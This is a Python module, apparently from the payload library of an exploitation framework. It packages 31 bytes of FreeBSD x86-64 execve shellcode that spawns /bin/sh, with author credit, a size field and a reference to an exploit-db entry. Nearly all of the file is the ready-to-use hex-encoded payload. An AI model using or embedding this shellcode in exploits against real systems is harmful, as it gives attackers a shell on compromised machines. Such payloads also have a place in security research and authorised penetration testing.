from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Maycon M. Vitali"
    Shellcode.info["name"] = "FreeBSDx64 - execve shellcode"
    Shellcode.info["references"] = [
        "https://www.exploit-db.com/exploits/13279/",
    ]
    Shellcode.info["size"] = 31
    Shellcode.info["payload"] = [
        r"\x48\x31\xc0\x99\xb0\x3b"
        r"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
        r"\x48\xc1\xef\x08\x57\x48\x89\xe7\x57\x52"
        r"\x48\x89\xe6\x0f\x05"
    ]
